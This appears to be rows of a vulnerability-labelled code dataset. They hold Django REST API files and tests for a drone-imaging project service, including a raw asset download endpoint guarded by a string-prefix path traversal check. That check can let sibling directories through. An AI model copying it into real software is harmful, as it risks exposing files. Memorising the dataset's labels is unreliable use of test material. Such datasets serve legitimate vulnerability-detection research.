        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        res = client.get('/api/projects/{}/'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can filter
        res = client.get('/api/projects/?name=999')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data[""results""]) == 0)

        # Cannot list somebody else's project without permission
        res = client.get('/api/projects/?id={}'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data[""results""]) == 0)

        # Can access individual project
        res = client.get('/api/projects/{}/'.format(project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data[""id""] == project.id)

        # Cannot access project for which we have no access to
        res = client.get('/api/projects/{}/'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can create project, but owner cannot be set
        res = client.post('/api/projects/', {'name': 'test', 'description': 'test descr'})
        self.assertEqual(res.status_code, status.HTTP_201_CREATED)
        self.assertTrue(Project.objects.get(pk=res.data['id']).owner.id == user.id)

        # Cannot leave name empty
        res = client.post('/api/projects/', {'description': 'test descr'})
        self.assertEqual(res.status_code, status.HTTP_400_BAD_REQUEST)


        # Create some tasks
        task = Task.objects.create(project=project)
        task2 = Task.objects.create(project=project, created_at=task.created_at + datetime.timedelta(0, 1))
        other_task = Task.objects.create(project=other_project)

        # Can list project tasks to a project we have access to
        res = client.get('/api/projects/{}/tasks/'.format(project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 2)

        # Can sort
        res = client.get('/api/projects/{}/tasks/?ordering=created_at'.format(project.id))
        self.assertTrue(res.data[0]['id'] == task.id)
        self.assertTrue(res.data[1]['id'] == task2.id)

        res = client.get('/api/projects/{}/tasks/?ordering=-created_at'.format(project.id))
        self.assertTrue(res.data[0]['id'] == task2.id)
        self.assertTrue(res.data[1]['id'] == task.id)

        # Cannot list project tasks for a project we don't have access to
        res = client.get('/api/projects/{}/tasks/'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Cannot list project tasks for a project that doesn't exist
        res = client.get('/api/projects/999/tasks/')
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)
        
        # Can list task details for a task belonging to a project we have access to
        res = client.get('/api/projects/{}/tasks/{}/'.format(project.id, task.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data[""id""] == task.id)

        # images_count field exists
        self.assertTrue(res.data[""images_count""] == 0)

        # Get console output
        res = client.get('/api/projects/{}/tasks/{}/output/'.format(project.id, task.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data == """")

        task.console_output = ""line1\nline2\nline3""
        task.save()

        res = client.get('/api/projects/{}/tasks/{}/output/'.format(project.id, task.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data == task.console_output)

        # Console output with line num
        res = client.get('/api/projects/{}/tasks/{}/output/?line=2'.format(project.id, task.id))
        self.assertTrue(res.data == ""line3"")

        # Console output with line num out of bounds
        res = client.get('/api/projects/{}/tasks/{}/output/?line=3'.format(project.id, task.id))
        self.assertTrue(res.data == """")
        res = client.get('/api/projects/{}/tasks/{}/output/?line=-1'.format(project.id, task.id))
        self.assertTrue(res.data == task.console_output)

        # Cannot list task details for a task belonging to a project we don't have access to
        res = client.get('/api/projects/{}/tasks/{}/'.format(other_project.id, other_task.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # As above, but by trying to trick the API by using a project we have access to
        res = client.get('/api/projects/{}/tasks/{}/'.format(project.id, other_task.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Cannot access task details for a task that doesn't exist
        res = client.get('/api/projects/{}/tasks/999/'.format(project.id, other_task.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can update a task
        res = client.patch('/api/projects/{}/tasks/{}/'.format(project.id, task.id), {'name': 'updated!'}, format='json')
        self.assertEqual(res.status_code, status.HTTP_200_OK)

        # Verify the task has been updated
        res = client.get('/api/projects/{}/tasks/{}/'.format(project.id, task.id))
        self.assertTrue(res.data[""name""] == ""updated!"")

        # Cannot update a task we have no access to
        res = client.patch('/api/projects/{}/tasks/{}/'.format(other_project.id, other_task.id), {'name': 'updated!'}, format='json')
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can cancel a task for which we have permission
        self.assertTrue(task.pending_action is None)
        res = client.post('/api/projects/{}/tasks/{}/cancel/'.format(project.id, task.id))
        self.assertTrue(res.data[""success""])
        task.refresh_from_db()
        self.assertTrue(task.last_error is None)
        self.assertTrue(task.pending_action == pending_actions.CANCEL)

        res = client.post('/api/projects/{}/tasks/{}/restart/'.format(project.id, task.id))
        self.assertTrue(res.data[""success""])
        task.refresh_from_db()
        self.assertTrue(task.last_error is None)
        self.assertTrue(task.pending_action == pending_actions.RESTART)

        # Cannot cancel, restart or delete a task for which we don't have permission
        for action in ['cancel', 'remove', 'restart']:
            res = client.post('/api/projects/{}/tasks/{}/{}/'.format(other_project.id, other_task.id, action))
            self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can delete
        res = client.post('/api/projects/{}/tasks/{}/remove/'.format(project.id, task.id))
        self.assertTrue(res.data[""success""])
        task.refresh_from_db()
        self.assertTrue(task.last_error is None)
        self.assertTrue(task.pending_action == pending_actions.REMOVE)


        # TODO test:
        # - tiles.json requests
        # - task creation via file upload
        # - scheduler processing steps
        # - tiles API urls (permissions, 404s)
        # - assets download (aliases)
        # - assets raw downloads
        # - project deletion

    def test_processingnodes(self):
        client = APIClient()

        pnode = ProcessingNode.objects.create(
                hostname=""localhost"",
                port=999
            )

        another_pnode = ProcessingNode.objects.create(
            hostname=""localhost"",
            port=998
        )

        # Cannot list processing nodes as guest
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)

        res = client.get('/api/processingnodes/{}/'.format(pnode.id))
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)

        client.login(username=""testuser"", password=""test1234"")

        # Cannot list processing nodes, unless permissions have been granted
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 0)

        user = User.objects.get(username=""testuser"")
        self.assertFalse(user.is_staff)
        self.assertFalse(user.is_superuser)
        self.assertFalse(user.has_perm('view_processingnode', pnode))
        assign_perm('view_processingnode', user, pnode)
        self.assertTrue(user.has_perm('view_processingnode', pnode))

        # Now we can list processing nodes as normal user
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 1)
        self.assertTrue(res.data[0][""hostname""] == ""localhost"")

        # Can use filters
        res = client.get('/api/processingnodes/?id={}'.format(pnode.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 1)

        res = client.get('/api/processingnodes/?id={}'.format(another_pnode.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 0)

        # Can filter nodes with valid options
        res = client.get('/api/processingnodes/?has_available_options=true')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 0)

        res = client.get('/api/processingnodes/?has_available_options=false')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 1)
        self.assertTrue(res.data[0]['hostname'] == 'localhost')


        # Can get single processing node as normal user
        res = client.get('/api/processingnodes/{}/'.format(pnode.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data[""hostname""] == ""localhost"")


        # Cannot delete a processing node as normal user
        res = client.delete('/api/processingnodes/{}/'.format(pnode.id))
        self.assertTrue(res.status_code, status.HTTP_403_FORBIDDEN)

        # Cannot create a processing node as normal user
        res = client.post('/api/processingnodes/', {'hostname': 'localhost', 'port':'1000'})
        self.assertTrue(res.status_code, status.HTTP_403_FORBIDDEN)

        client.login(username=""testsuperuser"", password=""test1234"")

        # Can delete a processing node as super user
        res = client.delete('/api/processingnodes/{}/'.format(pnode.id))
        self.assertTrue(res.status_code, status.HTTP_200_OK)

        # Can create a processing node as super user
        res = client.post('/api/processingnodes/', {'hostname': 'localhost', 'port':'1000'})
        self.assertTrue(res.status_code, status.HTTP_200_OK)

        # Verify node has been created
        res = client.get('/api/processingnodes/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data) == 2)
        self.assertTrue(res.data[1][""port""] == 1000)

/n/n/n",0
217,7530515f25d8f5a2a1e1e2b2d6d8fc9d711f730a,"/app/api/common.py/n/nfrom django.core.exceptions import ObjectDoesNotExist
from rest_framework import exceptions

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """"""
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """"""
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }/n/n/n/app/api/tasks.py/n/nimport mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """"""
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """"""
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """"""
        Retrieve the console output for this task.
        An optional ""line"" query param can be passed to retrieve
        only the output starting from a certain line number.
        """"""
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or """"
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({""id"": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail=""Cannot create task, input provided is not valid."")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="""", x="""", y=""""):
        """"""
        Get an orthophoto tile
        """"""
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, ""rb"")
            return HttpResponse(FileWrapper(tile), content_type=""image/png"")
        else:
            raise exceptions.NotFound()


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """"""
        Get tile.json for this tasks's orthophoto
        """"""
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast(""orthophoto"", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


class TaskAssets(TaskNestedView):
        def get(self, request, pk=None, project_pk=None, asset=""""):
            """"""
            Downloads a task asset (if available)
            """"""
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound(""Asset does not exist"")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, ""rb"")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or ""application/zip""))
                response['Content-Disposition'] = ""attachment; filename={}"".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()/n/n/n/app/api/urls.py/n/nfrom django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),

    url(r'^auth/', include('rest_framework.urls')),
]/n/n/n",1
218,7530515f25d8f5a2a1e1e2b2d6d8fc9d711f730a,"app/api/common.py/n/nfrom django.core.exceptions import ObjectDoesNotExist, SuspiciousFileOperation
from rest_framework import exceptions
import os

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """"""
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """"""
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }

def path_traversal_check(unsafe_path, known_safe_path):
    known_safe_path = os.path.abspath(known_safe_path)
    unsafe_path = os.path.abspath(unsafe_path)

    if (os.path.commonprefix([known_safe_path, unsafe_path]) != known_safe_path):
        raise SuspiciousFileOperation(""{} is not safe"".format(unsafe_path))

    # Passes the check
    return unsafe_path/n/n/napp/api/tasks.py/n/nimport mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist, SuspiciousFileOperation
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json, path_traversal_check

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """"""
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """"""
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """"""
        Retrieve the console output for this task.
        An optional ""line"" query param can be passed to retrieve
        only the output starting from a certain line number.
        """"""
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or """"
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({""id"": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail=""Cannot create task, input provided is not valid."")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="""", x="""", y=""""):
        """"""
        Get an orthophoto tile
        """"""
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, ""rb"")
            return HttpResponse(FileWrapper(tile), content_type=""image/png"")
        else:
            raise exceptions.NotFound()


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """"""
        Get tile.json for this tasks's orthophoto
        """"""
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast(""orthophoto"", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


""""""
Task downloads are simply aliases to download the task's assets
(but require a shorter path and look nicer the API user)
""""""
class TaskDownloads(TaskNestedView):
        def get(self, request, pk=None, project_pk=None, asset=""""):
            """"""
            Downloads a task asset (if available)
            """"""
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound(""Asset does not exist"")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, ""rb"")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or ""application/zip""))
                response['Content-Disposition'] = ""attachment; filename={}"".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()

""""""
Raw access to the task's asset folder resources
Useful when accessing a textured 3d model, or the Potree point cloud data
""""""
class TaskAssets(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, unsafe_asset_path=""""):
        """"""
        Downloads a task asset (if available)
        """"""
        task = self.get_and_check_task(request, pk, project_pk)

        # Check for directory traversal attacks
        try:
            asset_path = path_traversal_check(task.assets_path(unsafe_asset_path), task.assets_path(""""))
        except SuspiciousFileOperation:
            raise exceptions.NotFound(""Asset does not exist"")

        if (not os.path.exists(asset_path)) or os.path.isdir(asset_path):
            raise exceptions.NotFound(""Asset does not exist"")

        asset_filename = os.path.basename(asset_path)

        file = open(asset_path, ""rb"")
        response = HttpResponse(FileWrapper(file),
                                content_type=(mimetypes.guess_type(asset_filename)[0] or ""application/zip""))
        response['Content-Disposition'] = ""inline; filename={}"".format(asset_filename)
        return response
/n/n/napp/api/urls.py/n/nfrom django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskDownloads, TaskAssets
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskDownloads.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/assets/(?P<unsafe_asset_path>.+)$', TaskAssets.as_view()),

    url(r'^auth/', include('rest_framework.urls')),
]/n/n/napp/tests/test_api.py/n/nfrom guardian.shortcuts import assign_perm

from app import pending_actions
from .classes import BootTestCase
from rest_framework.test import APIClient
from rest_framework import status
import datetime

from app.models import Project, Task
from nodeodm.models import ProcessingNode
from django.contrib.auth.models import User

class TestApi(BootTestCase):
    def setUp(self):
        pass

    def tearDown(self):
        pass

    def test_projects_and_tasks(self):
        client = APIClient()

        user = User.objects.get(username=""testuser"")
        self.assertFalse(user.is_superuser)

        project = Project.objects.create(
                owner=user,
                name=""test project""
            )
        other_project = Project.objects.create(
                owner=User.objects.get(username=""testuser2""),
                name=""another test project""
            )

        # Forbidden without credentials
        res = client.get('/api/projects/')
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)
        
        client.login(username=""testuser"", password=""test1234"")
        res = client.get('/api/projects/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data[""results""]) > 0)

        # Can sort
        res = client.get('/api/projects/?ordering=-created_at')
        last_project = Project.objects.filter(owner=user).latest('created_at')
        self.assertTrue(res.data[""results""][0]['id'] == last_project.id)

        res = client.get('/api/projects/{}/'.format(project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)

        res = client.get('/api/projects/dasjkldas/')
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        res = client.get('/api/projects/{}/'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can filter
        res = client.get('/api/projects/?name=999')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data[""results""]) == 0)

        # Cannot list somebody else's project without permission
        res = client.get('/api/projects/?id={}'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data[""results""]) == 0)

        # Can access individual project
        res = client.get('/api/projects/{}/'.format(project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(res.data[""id""] == project.id)

        # Cannot access project for which we have no access to
        res = client.get('/api/projects/{}/'.format(other_project.id))
        self.assertEqual(res.status_code, status.HTTP_404_NOT_FOUND)

        # Can create project, but owner cannot be set
        res = client.post('/api/projects/', {'name': 'test', 'description': 'test descr'})
